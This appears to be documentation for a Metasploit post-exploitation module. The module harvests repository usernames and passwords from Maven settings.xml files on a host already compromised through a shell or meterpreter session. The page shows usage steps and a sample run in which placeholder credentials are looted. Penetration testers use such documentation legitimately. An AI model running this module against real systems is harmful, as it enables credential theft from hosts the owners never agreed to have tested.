## Vulnerable Application

[Maven](https://maven.apache.org/) a software project management.
This module seeks all settings.xml (Maven configuration file) on the target file system to extract credentials from them.
Credentials are store in the <server> tag ; the module also tries to cross the identifier found with the <mirror> or
<repository> tag in order to find the full realm the credentials belong to.

This module was successfully tested against:

- Ubuntu 14.04 and Maven 3.0.5 with shell and meterpreter as session type
- Debian 9 and Maven 3.0.5 with shell and meterpreter as session type

## Verification Steps

  1. Get a `shell` or `meterpreter` session on some host.
  2. Do: ```use post/multi/gather/maven_creds```
  3. Do: ```set SESSION [SESSION_ID]```
  4. Do: ```run```
  5. If the system has readable configuration files (settings.xml) containing username and passwords, they will be printed out.

## Scenarios

### Ubuntu 14.04 and Maven version 3.0.5

```
msf post(maven_creds) > run

[*] Finding user directories
[*] Unix OS detected
[*] Looting 19 files
[*] Downloading /home/user/settings.xml
[*] Reading settings.xml file from /home/user/settings.xml
[*] Collected the following credentials:
[*]     Id: server-nexus-dev
[*]     Username: deploynexus-dev
[*]     Password: password-dev
[*] Try to find url from id...
[*] No url found, id will be set as realm

[*] Collected the following credentials:
[*]     Id: server-nexus-int
[*]     Username: deploynexus-int
[*]     Password: password-int
[*] Try to find url from id...
[*] Found url in mirror : http://www.myhost.com/int

[*] Collected the following credentials:
[*]     Id: server-nexus-prd
[*]     Username: deploynexus-prd
[*]     Password: password-prd
[*] Try to find url from id...
[*] Found url in repository : http://www.myhost.com/prd


msf post(maven_creds) > creds

Credentials
===========

host  origin  service  public              private         realm                        private_type
----  ------  -------  ------              -------         -----                        ------------
                       deploynexus-dev     password-dev    server-nexus-dev             Password
                       deploynexus-int     password-int    http://www.myhost.com/int    Password
                       deploynexus-prd     password-prd    http://www.myhost.com/prd    Password